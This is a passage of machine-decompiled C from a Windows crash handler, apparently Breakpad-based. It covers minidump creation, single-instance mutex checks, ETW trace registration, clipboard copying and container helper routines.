  return puVar2;
}



int ** __fastcall FUN_00409256(int **param_1)

{
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  if (*(char *)((int)ppiVar3 + 0xd) == '\0') {
    piVar1 = *ppiVar3;
    if (*(char *)((int)*ppiVar3 + 0xd) != '\0') {
      while ((ppiVar3 = (int **)ppiVar3[1], *(char *)((int)ppiVar3 + 0xd) == '\0' &&
             (*param_1 == *ppiVar3))) {
        *param_1 = (int *)ppiVar3;
      }
      if (*(char *)((int)*param_1 + 0xd) == '\0') {
        *param_1 = (int *)ppiVar3;
      }
      return param_1;
    }
    do {
      piVar2 = piVar1;
      piVar1 = (int *)piVar2[2];
    } while (*(char *)((int)(int *)piVar2[2] + 0xd) == '\0');
  }
  else {
    piVar2 = ppiVar3[2];
  }
  *param_1 = piVar2;
  ppiVar3 = (int **)FUN_00409297(param_1);
  return ppiVar3;
}



undefined4 __fastcall FUN_00409297(undefined4 param_1)

{
  return param_1;
}



void __thiscall
FUN_0040929a(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0xaaaaaa8 < *(uint *)((int)this + 4)) {
    FUN_004091f8(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_00409344:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_00409344;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __fastcall FUN_004093bf(LPCWSTR param_1)

{
  SIZE_T dwBytes;
  int iVar1;
  BOOL BVar2;
  HGLOBAL hMem;
  LPVOID _Dst;
  HANDLE pvVar3;
  
  iVar1 = lstrlenW(param_1);
  BVar2 = OpenClipboard((HWND)0x0);
  if (BVar2 != 0) {
    EmptyClipboard();
    dwBytes = (iVar1 + 1) * 2;
    hMem = GlobalAlloc(0x2002,dwBytes);
    _Dst = GlobalLock(hMem);
    if (_Dst != (LPVOID)0x0) {
      FID_conflict__memcpy(_Dst,param_1,dwBytes);
    }
    GlobalUnlock(hMem);
    pvVar3 = SetClipboardData(0xd,hMem);
    if (pvVar3 == (HANDLE)0x0) {
      GlobalFree(hMem);
    }
                    // WARNING: Could not recover jumptable at 0x00409425. Too many branches
                    // WARNING: Treating indirect jump as call
    CloseClipboard();
    return;
  }
  return;
}



undefined4 * __thiscall FUN_0040942e(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_004300e8;
  FUN_004094e2((int)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



DWORD __thiscall FUN_00409453(void *this,int param_1,undefined4 param_2)

{
  undefined uVar1;
  DWORD DVar2;
  undefined4 uVar3;
  longlong lVar4;
  
  if (param_1 == 4) {
    lVar4 = GetTraceLoggerHandle(param_2);
    DVar2 = 0;
    *(int *)((int)this + 0x20) = (int)lVar4;
    *(int *)((int)this + 0x24) = (int)((ulonglong)lVar4 >> 0x20);
    if (lVar4 == 0) {
      DVar2 = GetLastError();
    }
    else {
      uVar3 = GetTraceEnableFlags(lVar4);
      *(undefined4 *)((int)this + 0x28) = uVar3;
      uVar1 = GetTraceEnableLevel(*(undefined4 *)((int)this + 0x20),
                                  *(undefined4 *)((int)this + 0x24));
      *(undefined *)((int)this + 0x2c) = uVar1;
                    // WARNING: Load size is inaccurate
      (**(code **)(*this + 4))();
    }
  }
  else if (param_1 == 5) {
                    // WARNING: Load size is inaccurate
    *(undefined *)((int)this + 0x2c) = 0;
    *(undefined4 *)((int)this + 0x28) = 0;
    *(undefined4 *)((int)this + 0x20) = 0;
    *(undefined4 *)((int)this + 0x24) = 0;
    (**(code **)(*this + 8))();
    DVar2 = 0;
  }
  else {
    DVar2 = 0x57;
  }
  return DVar2;
}



void FUN_004094cd(int param_1,void *param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_00409453(param_2,param_1,param_4);
  return;
}



void __fastcall FUN_004094e2(int param_1)

{
  UnregisterTraceGuids(*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x1c));
  *(undefined *)(param_1 + 0x2c) = 0;
  *(undefined4 *)(param_1 + 0x28) = 0;
  *(undefined4 *)(param_1 + 0x20) = 0;
  *(undefined4 *)(param_1 + 0x24) = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: static unsigned short * __cdecl std::char_traits<unsigned short>::copy(unsigned short
// *,unsigned short const *,unsigned int)
//  public: static wchar_t * __cdecl std::char_traits<wchar_t>::copy(wchar_t *,wchar_t const
// *,unsigned int)
// 
// Library: Visual Studio 2015 Release

void * __cdecl copy(void *param_1,void *param_2,int param_3)

{
  void *pvVar1;
  
  if (param_3 == 0) {
    return param_1;
  }
  pvVar1 = FID_conflict__memcpy(param_1,param_2,param_3 * 2);
  return pvVar1;
}



void * __cdecl FUN_00409529(void *param_1,void *param_2,int param_3)

{
  void *pvVar1;
  
  if (param_3 == 0) {
    return param_1;
  }
  pvVar1 = FID_conflict__memcpy(param_1,param_2,param_3 * 2);
  return pvVar1;
}



undefined4 * __thiscall FUN_0040954b(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_00430704;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040956b(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00430714;
  if (param_1[2] != 0) {
    CloseHandle((HANDLE)param_1[2]);
  }
  FUN_00401df0((int **)(param_1[1] + -0x10));
  return;
}



undefined4 * __thiscall FUN_0040958f(void *this,byte param_1)

{
  FUN_0040956b((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_004095ae(int param_1)

{
  uint *puVar1;
  uint uVar2;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  puVar1 = (uint *)(param_1 + 0x18);
  uVar2 = *puVar1;
  *puVar1 = *puVar1 + 1;
  *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + (uint)(0xfffffffe < uVar2);
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  return;
}



undefined4 * __fastcall FUN_004095d0(undefined4 *param_1)

{
  code *pcVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  undefined4 uVar6;
  
  *param_1 = &PTR_FUN_0043070c;
  *(undefined *)(param_1 + 1) = 0;
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 2,piVar2);
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  uVar6 = 0x18;
  param_1[7] = 0;
  param_1[8] = 0;
  uVar5 = FUN_00416f82(0x18);
  iVar3 = (int)uVar5;
  if (iVar3 != 0) {
    *(int *)iVar3 = iVar3;
    if ((int *)(iVar3 + 4) != (int *)0x0) {
      *(int *)(iVar3 + 4) = iVar3;
    }
    if ((int *)(iVar3 + 8) != (int *)0x0) {
      *(int *)(iVar3 + 8) = iVar3;
    }
    *(undefined2 *)(iVar3 + 0xc) = 0x101;
    param_1[7] = iVar3;
    param_1[9] = 0;
    DAT_00437b94 = 1;
    return param_1;
  }
  FUN_00422e78(uVar6,(int)((ulonglong)uVar5 >> 0x20));
  pcVar1 = (code *)swi(3);
  puVar4 = (undefined4 *)(*pcVar1)();
  return puVar4;
}



undefined4 * __thiscall FUN_0040963d(void *this,byte param_1)

{
  FUN_0040965c((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040965c(undefined4 *param_1)

{
  LPCRITICAL_SECTION p_Var1;
  
  *param_1 = &PTR_FUN_0043070c;
  p_Var1 = (LPCRITICAL_SECTION)param_1[3];
  if (p_Var1 != (LPCRITICAL_SECTION)0x0) {
    FUN_0040f774(p_Var1);
    FID_conflict__free(p_Var1);
    param_1[3] = 0;
  }
  DAT_00437b94 = 0;
  if ((void *)param_1[9] != (void *)0x0) {
    FUN_0040acc0((void *)param_1[9]);
  }
  FUN_0040a994((void **)(param_1 + 7));
  if ((undefined4 *)param_1[6] != (undefined4 *)0x0) {
    (***(code ***)(undefined4 *)param_1[6])(1);
  }
  if ((LPCRITICAL_SECTION)param_1[5] != (LPCRITICAL_SECTION)0x0) {
    FUN_0040ac8f((LPCRITICAL_SECTION)param_1[5]);
  }
  p_Var1 = (LPCRITICAL_SECTION)param_1[3];
  if (p_Var1 != (LPCRITICAL_SECTION)0x0) {
    FUN_0040f774(p_Var1);
    FID_conflict__free(p_Var1);
  }
  FUN_00401df0((int **)(param_1[2] + -0x10));
  *param_1 = &PTR_FUN_00430704;
  return;
}



DWORD __thiscall FUN_004096de(void *this,char param_1)

{
  DWORD DVar1;
  int *piVar2;
  int **this_00;
  undefined4 *this_01;
  int iVar3;
  undefined4 uVar4;
  uint extraout_EDX;
  undefined8 uVar5;
  int *local_18 [2];
  int *local_10;
  int local_c [2];
  
  DVar1 = GetCurrentThreadId();
  *(DWORD *)((int)this + 0x10) = DVar1;
  *(char *)((int)this + 4) = param_1;
  FUN_00402781((int *)&local_10,L"CrashHandlerLaunchedForMinidump");
  iVar3 = local_10[-3];
  FUN_00401df0((int **)(local_10 + -4));
  if (iVar3 == 0) {
    FUN_00408871((int *)local_18);
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(local_c,piVar2);
    FUN_00402fa2((CSimpleStringT_char_0_ *)local_c,L"%d");
    FUN_00404cfa(&local_10,(HMODULE)L"CommandLineMode");
    piVar2 = local_c;
    this_00 = FUN_0040ac0d(local_18,extraout_EDX,&local_10);
    FUN_00401b2a(this_00,piVar2);
    FUN_00401df0((int **)(local_10 + -4));
    DVar1 = 0;
    if (this != (void *)0xffffffdc) {
      this_01 = (undefined4 *)FUN_00416f82(0x1c);
      if (this_01 == (undefined4 *)0x0) {
        this_01 = (undefined4 *)0x0;
      }
      else {
        *(char *)this_01 = param_1;
        FUN_00411d09();
        uVar5 = FUN_00411f88();
        *(char *)((int)this_01 + 1) = (char)uVar5;
        piVar2 = (int *)FUN_0040139e();
        CSimpleStringT__(this_01 + 1,piVar2);
        piVar2 = (int *)FUN_0040139e();
        CSimpleStringT__(this_01 + 2,piVar2);
        this_01[3] = 0;
        this_01[4] = 0;
        this_01[5] = 0;
        this_01[6] = 0;
      }
      iVar3 = FUN_0041204e(this_01,local_18);
      if ((iVar3 < 0) || (uVar5 = FUN_004121a2(this_01), (int)uVar5 < 0)) {
        if (this_01 != (undefined4 *)0x0) {
          FUN_0040acc0(this_01);
        }
      }
      else {
        *(undefined4 **)((int)this + 0x24) = this_01;
      }
    }
    FUN_00411d09();
    uVar4 = FUN_00411ec0(param_1);
    if ((char)uVar4 != '\0') {
      DVar1 = FUN_004099e9(this);
    }
    FUN_00401df0((int **)(local_c[0] + -0x10));
    FUN_00408850((int *)local_18);
    FID_conflict__free(local_18[0]);
    return DVar1;
  }
  DVar1 = FUN_0040983b();
  return DVar1;
}



DWORD FUN_0040983b(void)

{
  undefined *puVar1;
  DWORD DVar2;
  void **this;
  uint uVar3;
  void *pvVar4;
  undefined4 extraout_ECX;
  undefined8 uVar5;
  void **local_38;
  int **local_34;
  undefined4 local_30;
  int *local_2c [2];
  void *local_24;
  uint local_20;
  int local_1c;
  undefined *local_18;
  HANDLE local_14;
  HMODULE local_10;
  HMODULE local_c;
  void *local_8;
  
  local_14 = (HANDLE)0x0;
  local_10 = (HMODULE)0x0;
  local_c = (HMODULE)0x0;
  local_8 = (void *)0x0;
  local_18 = (undefined *)0x0;
  DVar2 = FUN_0040bac8((uint *)&local_14,&local_10,&local_c,&local_8,&local_18);
  puVar1 = local_18;
  if ((int)DVar2 < 0) goto LAB_004099a2;
  pvVar4 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (pvVar4 != (void *)0x0) {
    local_24 = pvVar4;
    local_20 = FUN_00405bda(pvVar4,pvVar4,1);
    local_1c = 1;
    local_18 = &DAT_00000008;
    FUN_00401e16(&local_24,L"[CrashHandler][Preparing dump][%d-bit][pid %d]");
  }
  pvVar4 = (void *)FUN_00416f82(0x4c);
  if (pvVar4 == (void *)0x0) {
    this = (void **)0x0;
  }
  else {
    this = (void **)FUN_0040c0c3(pvVar4,puVar1);
  }
  uVar5 = FUN_0040c624((int)this);
  if ((HANDLE)uVar5 == (HANDLE)0xffffffff) {
LAB_004098f9:
    this = (void **)0x0;
  }
  else {
    FUN_0040c7da(this,(HANDLE)uVar5);
    uVar5 = FUN_0040c8e2(this);
    if ((char)uVar5 == '\0') goto LAB_004098f9;
  }
  local_38 = (void **)0x0;
  local_34 = (int **)0x0;
  local_30 = 0;
  FUN_00408871((int *)local_2c);
  local_34 = local_2c;
  local_38 = this;
  uVar5 = FUN_0040be4e(extraout_ECX,puVar1,local_10,local_c,(int)&local_38);
  DVar2 = (DWORD)uVar5;
  if (-1 < (int)DVar2) {
    uVar3 = FUN_0040f554((int)puVar1);
    if ((char)uVar3 == '\0') {
      DVar2 = 0x80004005;
    }
    else {
      local_1c = *(int *)(puVar1 + 0x1c);
      local_18 = (undefined *)(*(int *)(puVar1 + 0x18) + 1);
      DVar2 = FUN_00411a25(&local_1c,local_2c);
      if (-1 < (int)DVar2) {
        DVar2 = FUN_004117b1(local_8,local_2c);
        if (-1 < (int)DVar2) {
          SetEvent(local_14);
          DVar2 = 0;
        }
      }
    }
  }
  FUN_00408850((int *)local_2c);
  FID_conflict__free(local_2c[0]);
  if (this != (void **)0x0) {
    FUN_0040c15d(this);
    FID_conflict__free(this);
  }
LAB_004099a2:
  if (puVar1 != (undefined *)0x0) {
    FUN_0040ad35(puVar1);
  }
  if (local_8 != (HANDLE)0x0) {
    CloseHandle(local_8);
  }
  if (local_c != (HMODULE)0x0) {
    CloseHandle(local_c);
  }
  if (local_10 != (HMODULE)0x0) {
    CloseHandle(local_10);
  }
  if (local_14 != (HANDLE)0x0) {
    CloseHandle(local_14);
  }
  return DVar2;
}



DWORD __fastcall FUN_004099e9(HANDLE param_1)

{
  LPCRITICAL_SECTION p_Var1;
  undefined4 *puVar2;
  HANDLE pvVar3;
  DWORD DVar4;
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 *puVar5;
  void *pvVar6;
  int iVar7;
  ushort extraout_DX;
  UINT *pUVar8;
  undefined8 uVar9;
  wchar_t *pwVar10;
  tagMSG local_58;
  HMODULE local_3c [6];
  void *local_24;
  uint local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined **local_14;
  LPCWSTR local_10;
  HANDLE local_c;
  int local_8;
  
  FUN_00401e5a(local_3c);
  FUN_00404cfa(&local_8,(HMODULE)L"{C4F406E5-F024-4e3f-89A7-D5AB7663C3CD}");
  FUN_004022ce(local_8,extraout_DX & 0xff00 | (ushort)*(byte *)((int)param_1 + 4),local_3c);
  FUN_00401df0((int **)(local_8 + -0x10));
  local_14 = &PTR_FUN_00430714;
  FUN_00404cfa(&local_10,local_3c[0]);
  local_c = (HANDLE)0x0;
  pvVar3 = CreateMutexW((LPSECURITY_ATTRIBUTES)0x0,0,local_10);
  if (pvVar3 != (HANDLE)0x0) {
    local_c = pvVar3;
    DVar4 = GetLastError();
    if (DVar4 != 0xb7) {
      DVar4 = FUN_00411304(*(char *)((int)param_1 + 4),(void *)((int)param_1 + 8));
      if ((int)DVar4 < 0) {
        pvVar6 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
        if (pvVar6 == (void *)0x0) goto LAB_00409be2;
        local_24 = pvVar6;
        local_20 = FUN_00405bda(pvVar6,pvVar6,-1);
        pwVar10 = L"[CrashHandler][Failed to init crash dir][0x%08x]";
      }
      else {
        uVar9 = FUN_00409d58((int)param_1);
        DVar4 = (DWORD)uVar9;
        if (-1 < (int)DVar4) {
          local_58.hwnd = (HWND)0x0;
          pUVar8 = &local_58.message;
          for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
            *pUVar8 = 0;
            pUVar8 = pUVar8 + 1;
          }
          PeekMessageW(&local_58,(HWND)0x0,0x400,0x400,0);
          lpCriticalSection = (LPCRITICAL_SECTION)FUN_00416f82(0x24);
          if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
            lpCriticalSection = (LPCRITICAL_SECTION)0x0;
          }
          else {
            lpCriticalSection[1].DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)0x0;
            lpCriticalSection[1].LockCount = 0;
            lpCriticalSection[1].RecursionCount = 0;
            InitializeCriticalSection(lpCriticalSection);
          }
          p_Var1 = *(LPCRITICAL_SECTION *)((int)param_1 + 0x14);
          if (lpCriticalSection != p_Var1) {
            if (p_Var1 != (LPCRITICAL_SECTION)0x0) {
              FUN_0040ac8f(p_Var1);
            }
            *(LPCRITICAL_SECTION *)((int)param_1 + 0x14) = lpCriticalSection;
          }
          puVar5 = (undefined4 *)FUN_00416f82(0x14);
          if (puVar5 == (undefined4 *)0x0) {
            puVar5 = (undefined4 *)0x0;
          }
          else {
            *puVar5 = &PTR_FUN_00430fc0;
            puVar5[2] = 0;
            puVar5[3] = 0;
          }
          puVar2 = *(undefined4 **)((int)param_1 + 0x18);
          if (puVar5 != puVar2) {
            if (puVar2 != (undefined4 *)0x0) {
              (**(code **)*puVar2)(1);
            }
            *(undefined4 **)((int)param_1 + 0x18) = puVar5;
          }
          DVar4 = FUN_0040ea7a(*(void **)((int)param_1 + 0x18),*(LONG *)((int)param_1 + 0x14),
                               param_1,*(undefined *)((int)param_1 + 4));
          if (-1 < (int)DVar4) {
            DVar4 = FUN_0040a76a();
          }
          goto LAB_00409be2;
        }
        pvVar6 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
        if (pvVar6 == (void *)0x0) goto LAB_00409be2;
        local_24 = pvVar6;
        local_20 = FUN_00405bda(pvVar6,pvVar6,-1);
        pwVar10 = L"[CrashHandler][Failed to start Breakpad][0x%08x]";
      }
      local_1c = 0xffffffff;
      local_18 = 8;
      FUN_00401e16(&local_24,pwVar10);
      goto LAB_00409be2;
    }
  }
  pvVar6 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (pvVar6 != (void *)0x0) {
    local_24 = pvVar6;
    local_20 = FUN_00405bda(pvVar6,pvVar6,1);
    local_1c = 1;
    local_18 = 8;
    FUN_00401e16(&local_24,L"[CrashHandler][Instance is already running][%d-bit][%d]");
  }
  DVar4 = 0;
LAB_00409be2:
  FUN_0040956b(&local_14);
  FUN_00401e83((int *)local_3c);
  return DVar4;
}



DWORD FUN_00409bfb(uint param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,int param_5
                  ,LPPROCESS_INFORMATION param_6)

{
  LPVOID _Memory;
  int *piVar1;
  DWORD DVar2;
  uint uVar3;
  uint extraout_ECX;
  int extraout_EDX;
  int extraout_EDX_00;
  LPWSTR pWVar4;
  undefined6 uVar5;
  LPVOID local_24;
  undefined4 local_20;
  undefined4 local_1c;
  int **local_18 [2];
  int local_10;
  int *local_c;
  LPWSTR local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  if ((int)(1U - *(int *)(local_8 + -2) | *(int *)(local_8 + -4) - 0x104U) < 0) {
    ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
  }
  pWVar4 = local_8;
  DVar2 = GetModuleFileNameW((HMODULE)0x0,local_8,0x104);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  if (DVar2 == 0) {
    DVar2 = FUN_00407e13();
  }
  else {
    FUN_00408871((int *)local_18);
    FUN_00404cfa(&local_10,(HMODULE)L"True");
    FUN_00404cfa(&local_c,(HMODULE)L"CrashHandlerLaunchedForMinidump");
    FUN_0040ec13(local_18,&local_c,&local_10);
    FUN_00401df0((int **)(local_c + -4));
    FUN_00401df0((int **)(local_10 + -0x10));
    uVar5 = FUN_0040ba51(local_18,param_1,param_2,param_3,param_4,param_5);
    DVar2 = (DWORD)uVar5;
    if (-1 < (int)DVar2) {
      local_24 = (LPVOID)0x0;
      local_20 = 0;
      local_1c = 0;
      FUN_0040ec6e((int **)local_18,(short)((uint6)uVar5 >> 0x20),&DAT_0042f178,&local_24);
      uVar3 = 1U - *(int *)(pWVar4 + -2) | *(int *)(pWVar4 + -4) - 0x104U;
      if ((int)uVar3 < 0) {
        ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
        uVar3 = extraout_ECX;
        pWVar4 = local_8;
      }
      _Memory = local_24;
      DVar2 = FUN_00408044(uVar3,pWVar4,local_24,1,param_6);
      ReleaseBuffer((int *)&local_8,extraout_EDX_00,-1);
      if (_Memory != (LPVOID)0x0) {
        FID_conflict__free(_Memory);
      }
    }
    FUN_0040b05c(local_18,&param_5,(int **)*local_18[0],local_18[0]);
    FID_conflict__free(local_18[0]);
  }
  FUN_00401df0((int **)(pWVar4 + -8));
  return DVar2;
}



undefined8 __fastcall FUN_00409d58(int param_1)

{
  LPCRITICAL_SECTION *this;
  int *piVar1;
  int iVar2;
  DWORD DVar3;
  void **ppvVar4;
  LPCRITICAL_SECTION p_Var5;
  uint uVar6;
  uint extraout_ECX;
  undefined2 extraout_DX;
  undefined8 uVar7;
  undefined6 uVar8;
  undefined4 *puVar9;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined **local_50;
  undefined4 local_4c;
  undefined4 *local_48;
  uint local_44;
  undefined **local_40;
  undefined4 local_3c;
  undefined2 local_38 [12];
  undefined2 local_20 [12];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_44 = 0;
  FUN_004095ae((int)&PTR_PTR_FUN_00436578);
  basic_string__(local_20,extraout_DX,*(undefined4 **)(param_1 + 8));
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_48,piVar1);
  iVar2 = FUN_0041142f(&local_48);
  if (-1 < iVar2) {
    local_40 = &PTR_FUN_0042f168;
    local_3c = 0;
    DVar3 = FUN_004116de(extraout_ECX & 0xffffff00 | (uint)*(byte *)(param_1 + 4),&local_40);
    if (-1 < (int)DVar3) {
      local_50 = &PTR_FUN_0042f168;
      local_4c = 0;
      local_5c = 0;
      local_58 = 0;
      local_54 = 0;
      FUN_00403299(&local_5c,(int *)&local_40);
      uVar8 = FUN_00416f82(0xd0);
      if ((void *)uVar8 == (void *)0x0) {
        p_Var5 = (LPCRITICAL_SECTION)0x0;
      }
      else {
        local_44 = 1;
        puVar9 = &local_5c;
        ppvVar4 = (void **)basic_string__(local_38,(short)((uint6)uVar8 >> 0x20),local_48);
        uVar7 = FUN_0040f63c((void *)uVar8,ppvVar4,(LONG)puVar9);
        p_Var5 = (LPCRITICAL_SECTION)uVar7;
      }
      this = (LPCRITICAL_SECTION *)(param_1 + 0xc);
      FUN_0040a968(this,p_Var5);
      if ((local_44 & 1) != 0) {
        FUN_0040ae40(local_38,'\x01',(void *)0x0);
      }
      if ((*this == (LPCRITICAL_SECTION)0x0) || (uVar6 = FUN_0040f85b(*this), (char)uVar6 == '\0'))
      {
        p_Var5 = *this;
        if (p_Var5 != (LPCRITICAL_SECTION)0x0) {
          FUN_0040f774(p_Var5);
          FID_conflict__free(p_Var5);
          *this = (LPCRITICAL_SECTION)0x0;
        }
      }
      else {
        FUN_004095ae((int)&PTR_PTR_FUN_004365b8);
      }
      local_50 = &PTR_FUN_0042f168;
      FUN_00404a5c(&local_50);
    }
    local_40 = &PTR_FUN_0042f168;
    FUN_00404a5c(&local_40);
  }
  FUN_00401df0((int **)(local_48 + -4));
  FUN_0040ae40(local_20,'\x01',(void *)0x0);
  uVar7 = FUN_0041a954();
  return uVar7;
}



DWORD __thiscall FUN_00409ec7(void *this,int *param_1,int *param_2)

{
  byte bVar1;
  void *pvVar2;
  DWORD DVar3;
  void *local_18;
  uint local_14;
  undefined4 local_10;
  undefined4 local_c;
  
  bVar1 = *(byte *)((int)this + 4);
  FUN_004095ae((int)&PTR_PTR_FUN_004365d8);
  if (*(int *)(*param_1 + -0xc) == 0) {
    pvVar2 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (pvVar2 != (void *)0x0) {
      local_18 = pvVar2;
      local_14 = FUN_00405bda(pvVar2,pvVar2,1);
      local_10 = 1;
      local_c = 8;
      FUN_00401e16(&local_18,L"[No crash file]");
    }
    FUN_004095ae((int)&PTR_PTR_FUN_004365f8);
    DVar3 = 0x8000ffff;
  }
  else {
    DVar3 = FUN_00411951((uint)param_1 & 0xffffff00,*(char *)((int)this + 4),param_1,param_2);
    if ((int)DVar3 < 0) {
      pvVar2 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
      if (pvVar2 != (void *)0x0) {
        local_18 = pvVar2;
        local_14 = FUN_00405bda(pvVar2,pvVar2,-2);
        local_10 = 0xfffffffe;
        local_c = 8;
        FUN_00401e16(&local_18,L"[StartCrashReporter failed][0x%08x]");
      }
      FUN_004095ae((int)&PTR_PTR_FUN_00436618);
    }
    else {
      DVar3 = 0;
    }
  }
  FUN_004110f0(bVar1);
  return DVar3;
}



// WARNING: Could not reconcile some variable overlaps

void __cdecl FUN_00409fbf(void *param_1,DWORD param_2,HMODULE param_3)

{
  HMODULE lpFileName;
  int *piVar1;
  HANDLE pvVar2;
  DWORD DVar3;
  int iVar4;
  int **this;
  int **ppiVar5;
  undefined **ppuVar6;
  int **ppiVar7;
  void *pvVar8;
  undefined2 extraout_DX;
  uint uVar9;
  code *pcVar10;
  HANDLE hObject;
  HMODULE local_64;
  LPCWSTR local_60;
  int *piStack92;
  HANDLE pvStack88;
  int **local_54;
  int **ppiStack80;
  uint uStack76;
  undefined4 uStack72;
  undefined4 uStack68;
  int *local_40;
  int local_3c;
  int *apiStack56 [2];
  _SECURITY_ATTRIBUTES local_30;
  _SECURITY_ATTRIBUTES _Stack36;
  void *pvStack24;
  uint uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  if (param_3 == (HMODULE)0x0) {
    param_3 = (HMODULE)0x0;
  }
  else if (7 < (uint)param_3[5].unused) {
    param_3 = (HMODULE)param_3->unused;
  }
  FUN_00404cfa(&local_3c,param_3);
  FUN_0040a54e((int)param_1);
  FUN_0040a884(param_1,&local_64);
  FUN_00404cfa(&local_60,(HMODULE)&DAT_0042f178);
  lpFileName = local_64;
  uVar9 = *(uint *)(param_2 + 8) >> 1;
  local_40 = (int *)(uVar9 & 1 | (*(uint *)(param_2 + 8) >> 9) << 8);
  if ((uVar9 & 1) != 0) {
    piVar1 = FUN_00402958(&local_64,(int *)&local_54,local_64[-3].unused + -4);
    FUN_00401b2a(&local_60,piVar1);
    FUN_00401df0(local_54 + -4);
    FUN_00402d6d(&local_60,extraout_DX,(int)L"-full.dmp");
  }
  local_30.lpSecurityDescriptor = (LPVOID)0x0;
  local_30.bInheritHandle = 1;
  local_30.nLength = 0xc;
  pvStack88 = CreateFileW((LPCWSTR)lpFileName,0x40000000,0,&local_30,1,0x80,(HANDLE)0x0);
  hObject = (HANDLE)0x0;
  if ((((byte)uVar9 & 1 & (byte)(uVar9 & 1)) != 0) &&
     (pvVar2 = CreateFileW(local_60,0x40000000,0,&local_30,1,0x80,(HANDLE)0x0),
     pvVar2 != (HANDLE)0x0)) {
    hObject = pvVar2;
  }
  DVar3 = 0;
